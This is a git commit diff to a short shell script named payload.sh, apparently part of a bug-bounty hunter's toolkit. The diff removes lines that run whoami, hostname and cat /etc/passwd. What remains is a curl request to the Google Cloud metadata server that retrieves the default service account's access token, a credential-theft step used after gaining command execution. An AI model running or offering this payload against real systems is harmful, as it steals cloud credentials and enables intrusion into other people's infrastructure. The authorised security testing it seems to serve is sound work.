0c230e4f4afd857f3f56c0cf7af58a29126280d4
envoybughunter <envoybughunter@gmail.com>
2025-07-01 12:03:28 +0300

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,12 +1,5 @@
 #!/bin/bash
 
-echo "[+] Checking basic command execution:"
-whoami
-hostname
-
-echo "[+] /etc/passwd contents:"
-cat /etc/passwd
-
 echo "[+] Trying to access GCP metadata:"
 curl -s -H "Metadata-Flavor: Google" \
   "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
